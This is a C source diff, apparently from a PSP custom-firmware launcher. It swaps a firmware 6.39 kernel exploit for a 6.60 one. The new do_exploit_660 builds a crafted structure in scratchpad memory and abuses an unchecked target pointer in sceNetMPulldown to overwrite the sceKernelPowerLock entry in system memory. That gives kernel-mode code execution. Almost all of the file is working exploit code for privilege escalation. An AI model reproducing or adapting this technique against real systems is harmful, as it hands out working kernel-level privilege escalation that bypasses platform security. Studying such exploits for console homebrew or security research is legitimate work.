@@ -31,24 +31,43 @@
 #include "printk.h"
 #include "../PXE/Launcher/launcher_patch_offset.h"
 
-extern int sceHttpStorageOpen(int a0, int a1, int a2);
 extern int sceKernelPowerLock(unsigned int, unsigned int);
-
 int kernel_permission_call(void);
 
-void do_exploit_639(void)
+struct MPulldownExploit;
+
+int sceNetMPulldown(struct MPulldownExploit *data, int unk1, int unk2, int unk3);
+
+struct MPulldownExploit {
+	u32 *data; // unk_data
+	int unk1; // should be 0
+	void *target;
+	int target_size;
+	u32 unk_data[80]; // embeeded it
+};
+
+void do_exploit_660(void)
 {
+	struct MPulldownExploit *ptr;
+	int ret;
 	u32 kernel_entry, entry_addr;
 	u32 interrupts;
-	u32 i;
 
-	for(i=1; i<=6; ++i) {
-		sceUtilityLoadModule(i + 0xFF);
-	}
+	sceUtilityLoadModule(1 + 0xFF);
 
-	sceHttpStorageOpen(-612, 0, 0);
-	sync_cache();
-	sceHttpStorageOpen(((SYSMEM_TEXT_ADDR + g_offs->sysmem_patch.sceKernelPowerLockForUser)>>2), 0, 0); // scePowerLock override
+	ptr = (void*)0x00010000; // use scratchpad memory to bypass check at @sceNet_Service@+0x00002D80
+	memset(ptr, 0, sizeof(*ptr));
+	ptr->data = ptr->unk_data;
+	ptr->target_size = 1;
+	ptr->target = (void*)(SYSMEM_TEXT_ADDR + g_offs->sysmem_patch.sceKernelPowerLockForUser - ptr->target_size);
+
+	ptr->data[2] = (u32)(ptr->data);
+	ptr->data[3] = 4;
+	ptr->data[4*4+3] = 1;
+
+	// sceNetMCopydata didn't check ptr->target validation
+	ret = sceNetMPulldown(ptr, 0, 5, 0); // @sceNet_Service@+0x00003010
+	printk("%s: -> 0x%08X\n", __func__, ret);
 	sync_cache();
 
 	interrupts = pspSdkDisableInterrupts();
@@ -57,8 +76,5 @@ void do_exploit_639(void)
 	sceKernelPowerLock(0, ((u32) &entry_addr) - g_offs->sysmem_patch.sceKernelPowerLockForUser_data_offset);
 	pspSdkEnableInterrupts(interrupts);
 
-	for(i=6; i>=1; --i) {
-		sceUtilityUnloadModule(i + 0xFF);
-	}
+	sceUtilityUnloadModule(1 + 0xFF);
 }
-
